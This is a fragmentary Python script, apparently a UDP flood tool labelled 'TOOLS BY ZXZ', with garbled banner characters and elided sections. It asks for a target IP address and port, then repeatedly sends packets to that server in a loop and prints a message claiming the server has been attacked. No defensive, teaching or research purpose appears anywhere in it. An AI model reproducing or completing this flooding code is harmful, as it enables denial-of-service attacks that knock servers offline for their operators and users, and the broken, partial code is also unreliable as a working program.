...
print ("\033[31m                              â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
print ("\033[31m                              â•‘ \033[35m  TOOLS BY \033[34mZXZ  \033[31m â•‘") 
print ("\033[31m                              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

ip = str(input("\033[96m  Attack To IP \033[35m \033[91m "))
port = int(input("\033[96m  Attack To Port \033[35m \033[91m "))
choice = str(input("\033[96m  Attack y/n \033[35m \033[91m "))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[37m Dewaa Has Been Attack To Server")
		except:
